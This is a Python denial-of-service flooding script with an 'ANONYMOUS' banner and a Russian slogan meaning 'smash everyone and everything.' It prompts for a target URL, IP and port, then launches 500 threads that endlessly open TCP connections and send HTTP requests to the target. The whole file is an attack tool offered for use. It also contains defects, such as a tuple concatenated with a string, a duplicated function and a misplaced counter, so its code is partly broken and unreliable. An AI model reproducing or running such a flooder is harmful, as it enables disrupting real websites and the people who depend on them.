#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############
import threading
from threading import Thread, Timer
from concurrent.futures import ThreadPoolExecutor
from random import choice, randint
from socket import socket, AF_INET, SOCK_STREAM, error
import sys, glob, time, requests, ssl, webbrowser
import bz2, datetime, wget, json, cfscrape, urllib3
from colorama import Fore
from time import sleep
from scapy.all import *
import base64 as b64
import socket, threading
from threading import Thread
from random import randint
import requests, urllib3
import random
import re
import cfscrape
import time
import socket
import os, sys

os.system("clear")
print("""\033[93m
              ANONYMOUS
      ╭━━━╮     ╭╮ ╭━━━╮
      ┃╭━━╯     ┃┃ ╰╮╭╮┃
      ┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
      ┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
      ┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.3
      ╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
         Разнеси всех и вся 💥
""")

time.sleep(2.5)
#########################################################################
# IMPORT MODULE
import os, sys, socket, threading, random
#########################################################################
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
#########################################################################
#ip
print("\033[31m ╔═══\033[33m[ Введите [URL] Получите [IP] ] •")
url = input("\033[31m ┗━━━━━━\033[92m•> \033[0m")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print("\033[31m ╔═══\033[33m[ Ваша Цель [IP] ] •")
print("\033[92m v \033[0m")
print(ip)
time.sleep(0.5)
#########################################################################
# MAIN MENU 
print()
print("\033[31m ╔═══\033[33m[ Ваша Цель [IP] ] •")
target = str(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
time.sleep(0.5)
print("\033[31m ╔═══\033[33m[ PORT ] •")
port = int(input("\033[31m ┗━━━━━━\033[92m•> \033[0m"))
time.sleep(0.5)
clear()
print("\033[93m")
#########################################################################

fake_ip = '77.109.33.232','127.0.0.1'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)
        print("Atacando porta 💥")
        s.close()
